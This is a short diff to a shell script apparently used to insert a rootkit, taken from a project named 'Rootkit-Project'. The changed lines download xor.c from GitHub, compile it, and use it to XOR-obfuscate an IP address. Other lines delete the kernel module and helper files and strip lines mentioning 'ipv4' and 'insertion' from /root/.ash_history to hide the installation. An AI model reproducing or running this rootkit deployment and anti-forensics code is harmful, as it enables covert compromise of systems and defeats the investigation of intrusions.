@@ -13,8 +13,8 @@ fi
 
 key=126
 
-wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/insert/xor
-chmod +x xor
+wget https://github.com/gobelinor/Rootkit-Project/raw/refs/heads/dev_tibo/mesmodules/insert/xor.c
+gcc -o xor xor.c
 encrypted=$(echo $IP_ADDR | ./xor $key)
 
 
@@ -33,3 +33,5 @@ rm ipv4.ko
 sed -i '/ipv4/d' /root/.ash_history
 sed -i '/insertion/d' /root/.ash_history
 rm insertion_script
+rm xor
+rm xor.c
